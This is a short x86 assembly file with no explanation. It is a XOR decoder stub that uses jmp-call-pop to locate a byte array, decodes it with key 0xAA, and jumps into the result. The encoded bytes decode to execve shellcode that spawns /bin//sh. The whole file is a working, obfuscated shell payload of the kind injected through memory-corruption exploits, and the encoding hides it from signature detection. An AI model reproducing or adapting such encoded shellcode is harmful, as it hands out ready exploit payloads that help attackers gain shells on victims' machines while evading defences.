global _start

section .text

_start:

    jmp short setshellc

decoder:
    pop esi ; pop address of our shellcode to esi
    xor ecx, ecx ; xor out ecx register
    mov cl, 0x25 ; set cl register to length of shellcode

decode:
    xor byte [esi], 0xaa ; xor the byte with 0xAA
    jz shellcode ; if the last aa byte is xor-d it will become 0x00
    inc esi ; increment esi
    jmp short decode ; next iteration of the loop
 

setshellc:
    call decoder
    shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa

